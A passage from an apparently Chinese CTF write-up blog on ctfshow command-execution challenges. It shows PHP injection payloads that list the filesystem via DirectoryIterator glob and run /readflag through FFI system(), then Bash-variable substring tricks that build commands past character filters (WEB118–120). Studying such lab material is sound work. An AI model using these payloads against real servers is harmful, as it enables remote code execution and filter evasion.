<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先是熟悉的确定flag位置和名称</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) </span><br><span class="line">	&#123; </span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;  &#x27;</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FFI调用system函数</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI :: cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="WEB118"><a href="#WEB118" class="headerlink" title="WEB118"></a>WEB118</h2><p>拿到题一脸懵，不知道该干啥，看源码知道?code，看大佬wp发现好东西</p>
<blockquote>
<p>root@baba:<del># echo ${PWD}<br>/root<br>root@baba:</del># echo ${PWD:1:1}   //表示从第2（1+1）个字符开始的一个字符<br>r<br>root@baba:<del># echo ${PWD:0:1}   //表示从第1（0+1）个字符开始的一个字符<br>/<br>root@baba:</del># echo ${PWD:<del>0:1}  //表示从最后一个字符开始的一个字符<br>t<br>root@baba:</del># echo ${PWD:~A}    //字母代表0<br>t</p>
</blockquote>
<p>利用各种环境变量来构造命令<br>首先需要知道${PWD}：看当前路径<br>${PATH}通常为bin<br>通过上面的规则来构造命令（若看不懂可以看Linux 基础知识：Bash的内置变量<br>常见 Bash 内置变量介绍）<br>由于通配符没有被过滤，则构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br><span class="line"><span class="comment">//在看源码就可以看到flag</span></span><br></pre></td></tr></table></figure>

<h2 id="web119-120"><a href="#web119-120" class="headerlink" title="web119~120"></a>web119~120</h2><p>比上题多过滤了path。</p>
<blockquote>
<p>SHLVL：是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。<br>RANDOM：此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。<br>在Linux中，$或$</p>
</blockquote>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/07/ctfshow web入门55_122 命令执行/">http://example.com/2022/01/07/ctfshow web入门55_122 命令执行/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%20php%E7%89%B9%E6%80%A7/"><i class="fa fa-chevron-left">  </i><span>ctfshow web入门 php特性</span></a></div><div class="next-post pull-right"><a href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span>ctfshow web入门 反序列化</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>